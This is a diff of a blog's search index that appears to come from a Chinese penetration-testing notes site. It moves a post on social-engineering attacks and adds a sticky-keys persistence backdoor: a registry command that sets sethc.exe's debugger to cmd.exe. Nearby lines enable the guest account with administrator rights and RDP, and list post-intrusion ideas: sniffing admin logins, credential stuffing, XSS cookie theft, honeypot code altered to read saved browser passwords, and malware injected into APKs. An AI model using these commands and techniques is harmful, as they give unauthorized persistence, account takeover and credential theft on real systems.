@@ -247,6 +247,28 @@
 ]]></content>
   </entry>
   <entry>
+    <title>社会工程学攻击经验总结</title>
+    <url>/2022/11/14/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6%E6%94%BB%E5%87%BB/</url>
+    <content><![CDATA[<h2 id="社会工程学攻击总结"><a href="#社会工程学攻击总结" class="headerlink" title="社会工程学攻击总结"></a>社会工程学攻击总结</h2><ol>
+<li><p>是否有客服？聊天交互引导点击，制作xss钓鱼点击获取后台cookie，发送木马等，ddos攻击威胁等…</p>
+</li>
+<li><p>将图片网页链接放进word、excle文档中，让对方点击获取ip</p>
+</li>
+<li><p>通过攻击嫌疑人网站引导嫌疑人攻击自己的蜜罐，通过向嫌疑人网站写入日志内容的方式不断攻击嫌疑人的网站，激怒对方，自己的链接可放上社交聊天的小号。</p>
+<p>比如添加 Referer: <a href="http://chsi-com.org.cn/">http://chsi-com.org.cn/</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/stcs3475/img/1647307767.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/stcs3475/img/1647308059(1).png"></p>
+<p>查看日志：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/stcs3475/img/1647308207(1).png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/stcs3475/img/1647309331(1).png"></p>
+</li>
+<li><p><a href="https://www.iculture.cc/knowledge/pig=10727">通过蜜罐技术获取攻击者的手机号、微信号</a>   修改代码后可读取电脑上其他文件，比如chrome保存的密码和浏览历史，qq等文件</p>
+</li>
+<li></li>
+</ol>
+]]></content>
+  </entry>
+  <entry>
     <title>业务逻辑漏洞</title>
     <url>/2022/11/16/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/</url>
     <content><![CDATA[<p><img src="http://192.168.31.156:8000/%E5%9B%BE%E7%89%87/HACK%E5%AD%A6%E4%B9%A0%E5%91%80_2018-07-16_%E6%83%8A%E9%99%A9%E5%88%BA%E6%BF%80%E7%9A%84%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/1_aPbK6xQJIHiaUOB16u0KcQnicDG9pg.png" alt="img"></p>
@@ -337,30 +359,8 @@
 ]]></content>
   </entry>
   <entry>
-    <title>社会工程学攻击经验总结</title>
-    <url>/2022/11/14/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6%E6%94%BB%E5%87%BB/</url>
-    <content><![CDATA[<h2 id="社会工程学攻击总结"><a href="#社会工程学攻击总结" class="headerlink" title="社会工程学攻击总结"></a>社会工程学攻击总结</h2><ol>
-<li><p>是否有客服？聊天交互引导点击，制作xss钓鱼点击获取后台cookie，发送木马等，ddos攻击威胁等…</p>
-</li>
-<li><p>将图片网页链接放进word、excle文档中，让对方点击获取ip</p>
-</li>
-<li><p>通过攻击嫌疑人网站引导嫌疑人攻击自己的蜜罐，通过向嫌疑人网站写入日志内容的方式不断攻击嫌疑人的网站，激怒对方，自己的链接可放上社交聊天的小号。</p>
-<p>比如添加 Referer: <a href="http://chsi-com.org.cn/">http://chsi-com.org.cn/</a></p>
-<p><img src="https://cdn.jsdelivr.net/gh/stcs3475/img/1647307767.png"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/stcs3475/img/1647308059(1).png"></p>
-<p>查看日志：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/stcs3475/img/1647308207(1).png"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/stcs3475/img/1647309331(1).png"></p>
-</li>
-<li><p><a href="https://www.iculture.cc/knowledge/pig=10727">通过蜜罐技术获取攻击者的手机号、微信号</a>   修改代码后可读取电脑上其他文件，比如chrome保存的密码和浏览历史，qq等文件</p>
-</li>
-<li></li>
-</ol>
-]]></content>
-  </entry>
-  <entry>
     <title>渗透测试之实战经验</title>
-    <url>/2022/11/23/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%AE%9E%E6%88%98%E7%BB%8F%E9%AA%8C/</url>
+    <url>/2022/12/27/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%AE%9E%E6%88%98%E7%BB%8F%E9%AA%8C/</url>
     <content><![CDATA[<h2 id="渗透测试之实战经验"><a href="#渗透测试之实战经验" class="headerlink" title="渗透测试之实战经验"></a>渗透测试之实战经验</h2><h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><h6 id="域名情况"><a href="#域名情况" class="headerlink" title="域名情况"></a>域名情况</h6><p>是否使用了第三方的内网穿透的子域名，比如xxx.github.io、网云穿等，如果是找到服务商。</p>
 <h6 id="whois信息"><a href="#whois信息" class="headerlink" title="whois信息"></a>whois信息</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">站点注册人注册过的其他网站(对注册人、邮箱、电话的反查)，对查到的站点的深入</span><br></pre></td></tr></table></figure>
 
@@ -493,7 +493,7 @@
 <h6 id="rar打包命令"><a href="#rar打包命令" class="headerlink" title="rar打包命令"></a>rar打包命令</h6><p>rar.exe a -ag -k -r -s -ibck c:&#x2F;bak.rar c:&#x2F;dat&#x2F;</p>
 <h6 id="msf-windows-shell乱码解决"><a href="#msf-windows-shell乱码解决" class="headerlink" title="msf windows shell乱码解决"></a>msf windows shell乱码解决</h6><p>输入chcp 65001</p>
 <h6 id="guest开启3389"><a href="#guest开启3389" class="headerlink" title="guest开启3389"></a>guest开启3389</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">net user  guest  /active:yes                      <span class="comment">#激活guest用户</span></span><br><span class="line">net localgroup  administrators  guest  /add       <span class="comment">#将guest用户添加到administrators</span></span><br><span class="line">net user guest    密码                            <span class="comment">#更改guest用户密码</span></span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="string">&quot; &quot;</span>Server /v fDenyTSConnections /t REG_DWORD /d <span class="number">00000000</span> /f   <span class="comment">#开启3389端口</span></span><br></pre></td></tr></table></figure>
-
+<h6 id="设置粘滞键后门"><a href="#设置粘滞键后门" class="headerlink" title="设置粘滞键后门"></a>设置粘滞键后门</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">REG ADD <span class="string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&quot;</span> /v Debugger /t REG_SZ /d <span class="string">&quot;C:\windows\system32\cmd.exe&quot;</span></span><br></pre></td></tr></table></figure>
 
 
 <h5 id="一些思路"><a href="#一些思路" class="headerlink" title="一些思路"></a>一些思路</h5><p>目前可进入目标网站后台和后续的渗透思路有以下一些：<br>1、修改后台登录入口嗅探登录的用户和密码；<br>2、通过加密算法生成密文字典进行撞库攻击；<br>3、通过加密算法生成密文后进入数据库修改；<br>4、XSS打Cookie或Flash水坑钓鱼等攻击方式；<br>5、APK中注入恶意程序，替换APK的下载地址；  </p>
